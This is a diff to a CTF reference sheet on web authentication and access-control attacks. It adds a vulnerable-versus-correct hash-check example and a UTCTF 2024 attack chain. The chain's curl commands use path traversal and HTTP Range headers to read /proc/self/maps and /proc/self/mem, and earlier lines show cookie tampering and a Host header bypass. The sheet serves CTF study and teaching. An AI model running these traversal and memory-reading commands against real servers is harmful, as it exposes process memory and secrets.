@@ -1,5 +1,24 @@
 # CTF Web - Auth & Access Control Attacks
 
+## Table of Contents
+- [JWT Attacks](#jwt-attacks)
+  - [Algorithm None](#algorithm-none)
+  - [Algorithm Confusion (RS256 → HS256)](#algorithm-confusion-rs256-hs256)
+  - [Weak Secret Brute-Force](#weak-secret-brute-force)
+  - [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
+- [Password/Secret Inference from Public Data](#passwordsecret-inference-from-public-data)
+- [Weak Signature/Hash Validation Bypass](#weak-signaturehash-validation-bypass)
+- [Client-Side Access Gate Bypass](#client-side-access-gate-bypass)
+- [NoSQL Injection (MongoDB)](#nosql-injection-mongodb)
+  - [Blind NoSQL with Binary Search](#blind-nosql-with-binary-search)
+- [Cookie Manipulation](#cookie-manipulation)
+- [Host Header Bypass](#host-header-bypass)
+- [Broken Auth: Always-True Hash Check (0xFun 2026)](#broken-auth-always-true-hash-check-0xfun-2026)
+- [/proc/self/mem via HTTP Range Requests (UTCTF 2024)](#procselfmem-via-http-range-requests-utctf-2024)
+- [Hidden API Endpoints](#hidden-api-endpoints)
+
+---
+
 ## JWT Attacks
 
 ### Algorithm None
@@ -103,6 +122,43 @@ curl -H "Cookie: isAdmin=true"
 GET /flag HTTP/1.1
 Host: 127.0.0.1
 ```
+
+## Broken Auth: Always-True Hash Check (0xFun 2026)
+
+**Pattern:** Auth function uses `if sha256(user_input)` instead of comparing hash to expected value.
+
+```python
+# VULNERABLE:
+if sha256(password.encode()).hexdigest():  # Always truthy (non-empty string)
+    grant_access()
+
+# CORRECT:
+if sha256(password.encode()).hexdigest() == expected_hash:
+    grant_access()
+```
+
+**Detection:** Source code review for hash functions used in boolean context without comparison.
+
+---
+
+## /proc/self/mem via HTTP Range Requests (UTCTF 2024)
+
+**Pattern (Home on the Range):** Flag loaded into process memory then deleted from disk.
+
+**Attack chain:**
+1. Path traversal to read `../../server.py`
+2. Read `/proc/self/maps` to get memory layout
+3. Use `Range: bytes=START-END` HTTP header against `/proc/self/mem`
+4. Search binary output for flag string
+
+```bash
+# Get memory ranges
+curl 'http://target/../../proc/self/maps'
+# Read specific memory range
+curl -H 'Range: bytes=94200000000000-94200000010000' 'http://target/../../proc/self/mem'
+```
+
+---
 
 ## Hidden API Endpoints
 Search JS bundles for `/api/internal/`, `/api/admin/`, undocumented endpoints.
